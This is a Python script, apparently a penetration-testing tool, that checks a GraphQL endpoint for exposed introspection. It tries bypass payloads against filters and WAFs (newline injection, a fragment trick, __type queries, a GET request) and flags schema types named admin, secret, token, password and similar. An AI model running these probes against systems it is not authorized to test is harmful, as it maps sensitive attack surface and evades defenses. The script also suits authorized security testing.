#!/usr/bin/env python3
"""gql_introspection.py — GraphQL introspection probe with bypass techniques.

Sends the standard __schema introspection query plus bypass variants (newline
injection, fragment trick, __type, GET method) and prints which ones worked.
Use against any /graphql endpoint. Requires only stdlib + curl.

Usage:
  python3 gql_introspection.py --endpoint https://target.com/graphql
  python3 gql_introspection.py --endpoint ... --header "Authorization: Bearer TOKEN"
  python3 gql_introspection.py --endpoint ... --proxy http://127.0.0.1:8080
  python3 gql_introspection.py --help
"""

import argparse
import json
import subprocess
import sys

INTROSPECTION_QUERY = "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name fields(includeDeprecated: true) { name isDeprecated } } } }"

BYPASSES = {
    "plain __schema": '{"query": "query { __schema { queryType { name } } }"}',
    "newline injection": '{"query": "query {\\n  __schema\\n  { queryType { name } } }"}',
    "fragment trick": '{"query": "fragment f on __Schema { queryType { name } } { ...f }"}',
    "__type instead of __schema": '{"query": "{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
}


def _run(curl_args: list) -> str:
    try:
        r = subprocess.run(curl_args, capture_output=True, text=True, timeout=45)
        return r.stdout
    except subprocess.TimeoutExpired:
        return ""


def main() -> int:
    ap = argparse.ArgumentParser(description="Probe GraphQL introspection and print bypass results.")
    ap.add_argument("--endpoint", required=True, help="GraphQL endpoint URL")
    ap.add_argument("--header", action="append", default=[], help="Extra HTTP header (repeatable)")
    ap.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    args = ap.parse_args()

    base = ["curl", "-s", "--max-time", "30", "-X", "POST", args.endpoint, "-H", "Content-Type: application/json"]
    for h in args.header:
        base += ["-H", h]
    if args.proxy:
        base += ["--proxy", args.proxy]

    print(f"[*] Endpoint: {args.endpoint}")
    resp = _run(base + ["-d", json.dumps({"query": INTROSPECTION_QUERY})])
    if '"__schema"' in resp:
        print("[HIT] Introspection ENABLED — full schema accessible")
        try:
            data = json.loads(resp)
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            interesting = [t["name"] for t in types if any(
                k in t.get("name", "").lower() for k in ("admin", "internal", "secret", "token", "password", "role", "debug", "legacy", "private", "key")
            )]
            if interesting:
                print(f"[+] Interesting types: {', '.join(sorted(interesting))}")
        except Exception:
            print(resp[:500])
        return 0

    print("[~] Introspection disabled or blocked — trying bypasses")
    for name, payload in BYPASSES.items():
        out = _run(base + ["-d", payload])
        if '"__schema"' in out or '__type' in out and '"fields"' in out:
            print(f"[HIT] Bypass works: {name}")
        else:
            print(f"[-]  {name}: no")

    get_url = f"{args.endpoint}?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"
    out = _run(["curl", "-s", "--max-time", "30", "-X", "GET", get_url])
    if '"__schema"' in out:
        print("[HIT] Introspection reachable via GET (WAF only filters POST)")
    else:
        print("[-]  GET method: no")
    return 0


if __name__ == "__main__":
    sys.exit(main())
